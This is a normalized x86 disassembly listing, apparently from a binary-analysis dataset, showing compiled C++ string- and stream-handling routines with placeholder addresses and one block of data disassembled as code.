add eax [ ebp - 0x4d4 ]
mov [ ebp - 0x4e0 ] eax
mov edx [ ebp - 0x4d8 ]
push edx
mov ecx [ ebp - 0x4dc ]
push ecx
mov eax [ ebp - 0x4e0 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x1a0 ]
sub edx [ ebp - 0x4d0 ]
mov [ ebp - 0x4e4 ] edx
mov ecx [ ebp - 0x4e4 ]
mov [ ebp - 0x4e8 ] ecx
mov [ ebp - 0x4e9 ] 0x0
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
lea eax [ ebp - 0x104 ]
mov eax [ ebp - 0x104 ]
jmp r-xdata
mov [ ebp - 0x464 ] edx
cmp [ ebp - 0xf0 ] 0x10
jb r-xdata
lea ecx [ ebp - 0x104 ]
mov ecx [ ebp - 0x104 ]
jmp r-xdata
mov edx [ ebp - 0x410 ]
mov [ ebp - 0xf4 ] edx
add eax edx
mov [ ebp - 0x418 ] eax
mov eax [ ebp - 0x418 ]
mov cl [ ebp - 0x411 ]
mov [ eax ] cl
lea ecx [ ebp - 0x58 ]
mov ecx [ ebp - 0x58 ]
jmp r-xdata
mov [ ebp - 0x39c ] eax
mov edx [ ebp - 0x394 ]
push edx
mov ecx [ ebp - 0x398 ]
push ecx
mov eax [ ebp - 0x39c ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x328 ]
mov [ ebp - 0x3a0 ] edx
mov [ ebp - 0x3a1 ] 0x0
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
lea eax [ ebp - 0x58 ]
mov eax [ ebp - 0x58 ]
jmp r-xdata
add ecx [ ebp - 0x350 ]
mov [ ebp - 0x358 ] ecx
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
mov [ ebp - 0x58c ] ecx
sub [ ebx + 0x1c ] 0x4
push 0x2
lea eax [ ebp - 0x2cc ]
push eax
call sub_4bb8e4
add esp 0x8
dec [ ebx + 0x1c ]
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov edx [ ebp - 0x59c ]
add edx 0x10
mov eax [ ebp - 0x59c ]
mov edx [ eax + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0x24c ] edx
add eax edx
mov [ ebp - 0x61c ] eax
mov eax [ ebp - 0x61c ]
mov cl [ ebp - 0x615 ]
mov [ eax ] cl
mov edx [ ebp - 0x24c ]
sub edx [ ebp - 0x5d8 ]
mov [ ebp - 0x5dc ] edx
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
add eax [ ebp - 0x5b8 ]
mov [ ebp - 0x5c4 ] eax
mov edx [ ebp - 0x5bc ]
push edx
mov ecx [ ebp - 0x5c0 ]
push ecx
mov eax [ ebp - 0x5c4 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x24c ]
sub edx [ ebp - 0x5b4 ]
mov [ ebp - 0x5c8 ] edx
mov ecx [ ebp - 0x5c8 ]
mov [ ebp - 0x5cc ] ecx
mov [ ebp - 0x5cd ] 0x0
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
mov [ ebp - 0x540 ] edx
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
lea ecx [ ebp - 0x1b0 ]
mov ecx [ ebp - 0x1b0 ]
jmp r-xdata
mov edx [ ebp - 0x4e8 ]
mov [ ebp - 0x1a0 ] edx
add eax edx
mov [ ebp - 0x4f0 ] eax
mov eax [ ebp - 0x4f0 ]
mov cl [ ebp - 0x4e9 ]
mov [ eax ] cl
lea ecx [ ebp - 0x104 ]
mov ecx [ ebp - 0x104 ]
jmp r-xdata
mov [ ebp - 0x468 ] eax
mov edx [ ebp - 0x460 ]
push edx
mov ecx [ ebp - 0x464 ]
push ecx
mov eax [ ebp - 0x468 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x3f4 ]
mov [ ebp - 0x46c ] edx
mov [ ebp - 0x46d ] 0x0
cmp [ ebp - 0xf0 ] 0x10
jb r-xdata
lea eax [ ebp - 0x104 ]
mov eax [ ebp - 0x104 ]
jmp r-xdata
add ecx [ ebp - 0x41c ]
mov [ ebp - 0x424 ] ecx
cmp [ ebp - 0xf0 ] 0x10
jb r-xdata
mov eax [ ebp - 0x3a0 ]
mov [ ebp - 0x48 ] eax
add ecx eax
mov [ ebp - 0x3a8 ] ecx
mov edx [ ebp - 0x3a8 ]
mov cl [ ebp - 0x3a1 ]
mov [ edx ] cl
lea eax [ ebp - 0x58 ]
mov eax [ ebp - 0x58 ]
jmp r-xdata
mov [ ebp - 0x35c ] eax
mov edx [ ebp - 0x354 ]
push edx
mov ecx [ ebp - 0x358 ]
push ecx
mov eax [ ebp - 0x35c ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x48 ]
sub edx [ ebp - 0x350 ]
mov [ ebp - 0x360 ] edx
mov ecx [ ebp - 0x360 ]
mov [ ebp - 0x364 ] ecx
mov [ ebp - 0x365 ] 0x0
cmp [ ebp - 0x44 ] 0x10
jb r-xdata
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
mov [ ebp - 0x624 ] edx
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
lea ecx [ ebp - 0x25c ]
mov ecx [ ebp - 0x25c ]
jmp r-xdata
mov edx [ ebp - 0x5cc ]
mov [ ebp - 0x24c ] edx
add eax edx
mov [ ebp - 0x5d4 ] eax
mov eax [ ebp - 0x5d4 ]
mov cl [ ebp - 0x5cd ]
mov [ eax ] cl
lea ecx [ ebp - 0x1b0 ]
mov ecx [ ebp - 0x1b0 ]
jmp r-xdata
mov [ ebp - 0x544 ] eax
mov edx [ ebp - 0x53c ]
push edx
mov ecx [ ebp - 0x540 ]
push ecx
mov eax [ ebp - 0x544 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x4cc ]
mov [ ebp - 0x548 ] edx
mov [ ebp - 0x549 ] 0x0
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
add ecx [ ebp - 0x4f4 ]
mov [ ebp - 0x4fc ] ecx
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
mov eax [ ebp - 0x46c ]
mov [ ebp - 0xf4 ] eax
add ecx eax
mov [ ebp - 0x474 ] ecx
mov edx [ ebp - 0x474 ]
mov cl [ ebp - 0x46d ]
mov [ edx ] cl
lea eax [ ebp - 0x104 ]
mov eax [ ebp - 0x104 ]
jmp r-xdata
mov [ ebp - 0x428 ] eax
mov edx [ ebp - 0x420 ]
push edx
mov ecx [ ebp - 0x424 ]
push ecx
mov eax [ ebp - 0x428 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0xf4 ]
sub edx [ ebp - 0x41c ]
mov [ ebp - 0x42c ] edx
mov ecx [ ebp - 0x42c ]
mov [ ebp - 0x430 ] ecx
mov [ ebp - 0x431 ] 0x0
cmp [ ebp - 0xf0 ] 0x10
jb r-xdata
mov edx [ ebp - 0x364 ]
mov [ ebp - 0x48 ] edx
add eax edx
mov [ ebp - 0x36c ] eax
mov eax [ ebp - 0x36c ]
mov cl [ ebp - 0x365 ]
mov [ eax ] cl
jmp r-xdata
lea ecx [ ebp - 0x25c ]
mov ecx [ ebp - 0x25c ]
jmp r-xdata
mov [ ebp - 0x628 ] eax
mov edx [ ebp - 0x620 ]
push edx
mov ecx [ ebp - 0x624 ]
push ecx
mov eax [ ebp - 0x628 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x5b0 ]
mov [ ebp - 0x62c ] edx
mov [ ebp - 0x62d ] 0x0
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
add ecx [ ebp - 0x5d8 ]
mov [ ebp - 0x5e0 ] ecx
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x1a0 ] eax
add ecx eax
mov [ ebp - 0x550 ] ecx
mov edx [ ebp - 0x550 ]
mov cl [ ebp - 0x549 ]
mov [ edx ] cl
lea eax [ ebp - 0x1b0 ]
mov eax [ ebp - 0x1b0 ]
jmp r-xdata
mov [ ebp - 0x500 ] eax
mov edx [ ebp - 0x4f8 ]
push edx
mov ecx [ ebp - 0x4fc ]
push ecx
mov eax [ ebp - 0x500 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x1a0 ]
sub edx [ ebp - 0x4f4 ]
mov [ ebp - 0x504 ] edx
mov ecx [ ebp - 0x504 ]
mov [ ebp - 0x508 ] ecx
mov [ ebp - 0x509 ] 0x0
cmp [ ebp - 0x19c ] 0x10
jb r-xdata
mov edx [ ebp - 0x430 ]
mov [ ebp - 0xf4 ] edx
add eax edx
mov [ ebp - 0x438 ] eax
mov eax [ ebp - 0x438 ]
mov cl [ ebp - 0x431 ]
mov [ eax ] cl
jmp r-xdata
mov eax [ ebp - 0x62c ]
mov [ ebp - 0x24c ] eax
add ecx eax
mov [ ebp - 0x634 ] ecx
mov edx [ ebp - 0x634 ]
mov cl [ ebp - 0x62d ]
mov [ edx ] cl
lea eax [ ebp - 0x25c ]
mov eax [ ebp - 0x25c ]
jmp r-xdata
mov [ ebp - 0x5e4 ] eax
mov edx [ ebp - 0x5dc ]
push edx
mov ecx [ ebp - 0x5e0 ]
push ecx
mov eax [ ebp - 0x5e4 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x24c ]
sub edx [ ebp - 0x5d8 ]
mov [ ebp - 0x5e8 ] edx
mov ecx [ ebp - 0x5e8 ]
mov [ ebp - 0x5ec ] ecx
mov [ ebp - 0x5ed ] 0x0
cmp [ ebp - 0x248 ] 0x10
jb r-xdata
mov edx [ ebp - 0x508 ]
mov [ ebp - 0x1a0 ] edx
add eax edx
mov [ ebp - 0x510 ] eax
mov eax [ ebp - 0x510 ]
mov cl [ ebp - 0x509 ]
mov [ eax ] cl
jmp r-xdata
mov edx [ ebp - 0x5ec ]
mov [ ebp - 0x24c ] edx
add eax edx
mov [ ebp - 0x5f4 ] eax
mov eax [ ebp - 0x5f4 ]
mov cl [ ebp - 0x5ed ]
mov [ eax ] cl
jmp r-xdata
sub_4c0458
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x1
sete dl
mov eax [ ebp + 0x8 ]
and edx 0x1
mov [ eax + 0x4c ] dl
lea ecx [ eax + 0xc ]
mov [ eax + 0x46 ] 0x0
mov [ eax + 0x14 ] ecx
lea edx [ eax + 0x10 ]
mov [ eax + 0x18 ] edx
lea ecx [ eax + 0x1c ]
mov [ eax + 0x24 ] ecx
lea edx [ eax + 0x20 ]
mov [ eax + 0x28 ] edx
lea ecx [ eax + 0x2c ]
mov [ eax + 0x34 ] ecx
lea edx [ eax + 0x30 ]
mov [ eax + 0x38 ] edx
xor edx edx
mov ecx [ eax + 0x18 ]
mov [ ecx ] edx
xor edx edx
mov ecx [ eax + 0x28 ]
mov [ ecx ] edx
xor edx edx
mov ecx [ eax + 0x38 ]
mov [ ecx ] edx
xor edx edx
mov ecx [ eax + 0x14 ]
mov [ ecx ] edx
xor edx edx
mov ecx [ eax + 0x24 ]
mov [ ecx ] edx
xor edx edx
mov ecx [ eax + 0x34 ]
mov [ ecx ] edx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x50 ] ecx
xor ecx ecx
mov edx [ rw-data ]
mov [ eax + 0x48 ] edx
mov [ eax + 0x40 ] ecx
pop ebp
retn
sub_4c0568
push ebp
mov ebp esp
add esp 0xffffffc0
mov eax rw-data
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
call sub_4c517c
test esi esi
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] 0xc
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
push eax
call sub_4c3b24
pop ecx
cmp eax 0x3
jne r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
inc [ ebp - 0xc ]
mov [ ebp - 0x18 ] 0x18
dec [ rw-data ]
jne r-xdata
push eax
call sub_4c3b58
pop ecx
cmp eax 0x3
jne r-xdata
dec [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
cmp eax 0x1
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ ebp - 0x2c ] edx
test [ eax + 0x10 ] 0x6
jne r-xdata
mov [ ebp - 0x18 ] 0x0
test bl bl
je r-xdata
push esi
call sub_4b0180
pop ecx
mov edi [ ebp - 0x2c ]
mov ebx [ rw-data ]
test edi edi
je r-xdata
mov edx [ eax + 0x30 ]
push edx
mov ecx [ edx ]
call [ ecx + 0x34 ]
pop ecx
inc eax
jne r-xdata
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ rw-data ]
test [ eax + 0x10 ] 0x6
jne r-xdata
mov eax [ ebx + 0x10 ]
or eax edi
mov [ ebp - 0x30 ] eax
push 0x0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2c ]
or eax 0x4
mov [ ebp - 0x2c ] eax
mov edi [ ebp - 0x34 ]
mov ebx [ rw-data ]
test edi edi
je r-xdata
mov edx [ eax + 0x30 ]
push edx
mov ecx [ edx ]
call [ ecx + 0x34 ]
pop ecx
inc eax
jne r-xdata
mov edx [ ebp - 0x30 ]
mov edx [ ebp - 0x30 ]
or edx 0x4
jmp r-xdata
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax [ rw-data ]
test [ eax + 0x10 ] 0x6
jne r-xdata
mov eax [ ebx + 0x10 ]
or eax edi
mov [ ebp - 0x38 ] eax
push 0x0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x34 ]
or eax 0x4
mov [ ebp - 0x34 ] eax
push edx
push ebx
call sub_4b02b0
add esp 0xc
mov edi [ ebp - 0x3c ]
mov ebx [ rw-data ]
test edi edi
je r-xdata
mov edx [ eax + 0x30 ]
push edx
mov ecx [ edx ]
call [ ecx + 0x34 ]
pop ecx
inc eax
jne r-xdata
mov edx [ ebp - 0x38 ]
mov edx [ ebp - 0x38 ]
or edx 0x4
jmp r-xdata
mov eax [ ebx + 0x10 ]
or eax edi
mov [ ebp - 0x40 ] eax
push 0x0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
or eax 0x4
mov [ ebp - 0x3c ] eax
push edx
push ebx
call sub_4b02b0
add esp 0xc
mov edx [ ebp - 0x40 ]
mov edx [ ebp - 0x40 ]
or edx 0x4
jmp r-xdata
push edx
push ebx
call sub_4b02b0
add esp 0xc
sub_4c0888
push ebp
mov ebp esp
add esp 0xfffffecc
mov eax rw-data
push ebx
push esi
push edi
lea ebx [ ebp - 0x28 ]
mov esi [ ebp + 0x8 ]
call sub_4c517c
cmp [ esi + 0x40 ] 0x0
je r-xdata
mov al 0x1
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
cmp [ esi + 0x46 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x50 ] 0x8
push 0xffff
push esi
mov ecx [ esi ]
call [ ecx + 0xc ]
add esp 0x8
mov edi eax
mov [ ebp - 0x56 ] 0xffff
cmp di [ ebp - 0x56 ]
sete al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x3c ] 0xc
lea ecx [ ebp - 0x60 ]
push ecx
call sub_408628
pop ecx
lea eax [ ebp - 0x60 ]
push eax
lea edx [ ebx + 0x8 ]
push edx
call sub_408650
add esp 0x8
mov ecx 0xf
mov [ ebx + 0x24 ] ecx
xor eax eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
xor eax eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx edi
dec edx
mov edx 0x1
jmp r-xdata
xor ecx ecx
mov [ ebx + 0x20 ] ecx
add edx ecx
mov [ edx ] al
lea eax [ ebx + 0x8 ]
push eax
call sub_408880
pop ecx
mov edi eax
cmp edi 0x1
ja r-xdata
cmp [ ebx + 0x24 ] 0x8
jae r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edx 0x8
jae r-xdata
mov cl 0x1
test cl cl
je r-xdata
mov eax [ ebx + 0x20 ]
push eax
push 0x8
push ebx
call sub_408678
add esp 0xc
inc [ ebp - 0x30 ]
mov [ ebp - 0x3c ] 0x18
mov [ ebp - 0x61 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edi [ ebx + 0x10 ]
mov edi [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0xfc ] edi
mov eax [ ebp - 0xfc ]
add eax [ ebx + 0x20 ]
mov [ ebp - 0x74 ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x68 ] eax
push 0x8
movsx edx [ ebp - 0x61 ]
push edx
mov ecx [ ebp - 0x68 ]
push ecx
call sub_4c4d44
add esp 0xc
mov [ ebp - 0x69 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ esi + 0x46 ] 0x0
je r-xdata
mov [ ebp - 0x78 ] edx
lea edx [ ebp - 0x54 ]
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x10c ] eax
lea eax [ esi + 0x48 ]
mov ecx [ ebp - 0x10c ]
mov [ ebp - 0x7c ] ecx
mov [ ebp - 0x80 ] eax
push edx
mov ecx [ ebp - 0x74 ]
push ecx
mov eax [ ebp - 0x7c ]
push eax
mov edx [ ebp - 0x80 ]
push edx
mov ecx [ esi + 0x40 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x18 ]
add esp 0x14
sub eax 0x1
jb r-xdata
mov edx 0x8
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x70 ]
mov cl [ ebp - 0x69 ]
mov [ eax ] cl
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
sub eax 0x2
je r-xdata
cmp [ esi + 0x46 ] 0x0
jne r-xdata
mov eax [ esi + 0x50 ]
push eax
push edi
push 0x1
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx eax
mov [ ebp - 0x11c ] edx
mov edi [ ebp - 0x54 ]
sub edi edx
mov [ ebp - 0x3c ] 0x18
test edi edi
jbe r-xdata
mov al 0x1
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
jmp r-xdata
test edi edi
jne r-xdata
mov al 0x1
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xe5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
xor eax eax
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
or ecx 0xffffffff
sub ecx [ ebx + 0x20 ]
cmp ecx 0x8
ja r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x9d ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x98 ] edx
mov ecx [ ebp - 0x98 ]
mov [ ebp - 0x9c ] ecx
mov eax [ ebp - 0x9c ]
push eax
call sub_4b0180
pop ecx
xor eax eax
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ ebp - 0x84 ] edx
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
push ecx
call sub_4c6cac
add esp 0x10
cmp edi eax
je r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xed ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
mov eax [ ebx + 0x20 ]
lea edx [ ebx + 0x8 ]
add eax 0x8
mov [ ebp - 0xa8 ] eax
push edx
mov edi eax
call sub_408880
pop ecx
mov [ ebp - 0xac ] eax
cmp [ ebp - 0xac ] 0x1
ja r-xdata
push ebx
call sub_4bbca8
pop ecx
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x8d ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x88 ] edx
mov ecx [ ebp - 0x88 ]
mov [ ebp - 0x8c ] ecx
mov eax [ ebp - 0x8c ]
push eax
call sub_4b0180
pop ecx
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xec ] ecx
mov edx [ ebp - 0xec ]
mov cl [ ebp - 0xe5 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0xac ]
dec ecx
mov ecx 0x1
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xa4 ] ecx
mov edx [ ebp - 0xa4 ]
mov cl [ ebp - 0x9d ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xf4 ] ecx
mov edx [ ebp - 0xf4 ]
mov cl [ ebp - 0xed ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
cmp edi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edi ecx
jbe r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x94 ] ecx
mov edx [ ebp - 0x94 ]
mov cl [ ebp - 0x8d ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
test edi edi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push edi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xc5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ ebp - 0xcd ] 0x0
mov edx [ ebx + 0x20 ]
mov [ ebp - 0xd4 ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xcc ] eax
mov eax [ ebp - 0xcc ]
mov cl [ ebp - 0xc5 ]
mov [ eax ] cl
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0xd4 ]
mov [ ebp - 0xd8 ] ecx
push 0x8
movsx eax [ ebp - 0xcd ]
push eax
mov edx [ ebp - 0xd8 ]
push edx
call sub_4c4d44
add esp 0xc
mov eax [ ebp - 0xa8 ]
mov [ ebp - 0xdc ] eax
mov [ ebp - 0xdd ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0xdc ]
mov [ ebx + 0x20 ] eax
add edx eax
mov [ ebp - 0xe4 ] edx
mov edx [ ebp - 0xe4 ]
mov cl [ ebp - 0xdd ]
mov [ edx ] cl
jmp r-xdata
sub_4c0ee8
inc eax
add [ eax ] al
add [ ebx ] al
add [ eax ] dh
add [ eax ] cl
add [ eax ] al
add [ edi ] dh
add [ eax ] al
add [ fs : eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x1004c15 ] bh
add [ eax ] bh
jae r-xdata
mov edx rw-data
cmp bh [ fs : edx ]
bound esp [ ecx + 0x73 ]
imul esp [ ebx + 0x5f ] 0x3c736f69
ja r-xdata
test bl 0x1
je r-xdata
dec [ ebp - 0x8 ]
mov eax rw-data
dec ebp
push 0x745f7261
sub al 0x73
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4b0180
pop ecx
dec esi
add dh dh
retn
cmp bh [ edx ]
arpl [ eax + 0x61 ] bp
jb r-xdata
test bl 0x2
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov ecx [ edx ]
mov [ ecx + 0x8 ] eax
je r-xdata
je r-xdata
push 0x0
push eax
call sub_4b3018
add esp 0x8
or [ ebx + 0x4dff10c0 ] al
clc
popad
imul esi [ ebx + esi * 2 + 0x3c ] 0x61686377
jb r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x10
dec [ ebp - 0x8 ]
or [ edi + edx - 0x1 ] dh
dec ebp
clc
je r-xdata
or [ edx + rw-data ] bh
mov [ ebp - 0x14 ] 0x4d8b000c
and [ esi ] bh
add [ eax ] al
hlt
sub_4c0f64
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0xc ]
call sub_4c517c
mov [ ebp - 0x8 ] 0x2
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov ecx [ ebp + 0x8 ]
mov edx rw-data
mov eax rw-data
test bl 0x2
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov ecx [ edx ]
mov [ ecx + 0x8 ] eax
je r-xdata
test bl 0x1
je r-xdata
dec [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0x10
dec [ ebp - 0x8 ]
push 0x0
push eax
call sub_4b3018
add esp 0x8
mov edx [ ebp + 0x8 ]
push edx
call sub_4b0180
pop ecx
sub_4c0fe0
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
call sub_4c517c
mov [ ebp - 0x8 ] 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov edx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
dec [ ebp - 0x8 ]
mov ecx rw-data
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
push 0x3
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x3c ]
push ecx
call sub_4b2f24
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x50 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4b0180
pop ecx
push 0x2
push 0x0
mov edx [ ebp + 0x8 ]
push edx
call sub_4c0458
add esp 0xc
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4c0888
pop ecx
test al al
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x50 ]
push ecx
call sub_4c6870
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ebx eax
xor eax eax
mov ebx eax
sub_4c1178
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x8 ] 0x2
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov edx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
dec [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
test [ ebp + 0xc ] 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x10 ]
push ecx
call sub_4c429c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_4b0180
